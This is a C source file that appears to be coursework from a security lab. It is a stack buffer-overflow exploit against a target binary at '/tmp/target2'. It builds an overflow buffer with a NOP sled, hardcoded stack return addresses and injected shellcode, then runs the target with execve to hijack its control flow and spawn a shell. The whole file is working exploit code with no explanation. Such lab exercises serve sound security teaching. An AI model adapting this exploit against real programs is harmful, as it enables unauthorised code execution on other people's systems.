#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  int bsize = 280;
  int nop_int = 180;
  long *addr_ptr;
  long addr = 0xbffffd04;

  char buf[1024];

  addr_ptr = (long*) buf;

  int i;
  for(i = 0; i < bsize; i += 4) {
    *(addr_ptr++) = addr;
  }

  addr = 0xbffffd0c;
  addr_ptr = (long*) (buf + 172);

  for(i = 0; i < nop_int; i++) {
    buf[i] = NOP;
  }

  *addr_ptr = addr;
  *(addr_ptr+1) = addr;

  int shell_len = strlen(shellcode);
  printf("%d\n", shell_len);
  for(i = 0; i < shell_len; i++) {
    buf[nop_int + i] = shellcode[i];
  }

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
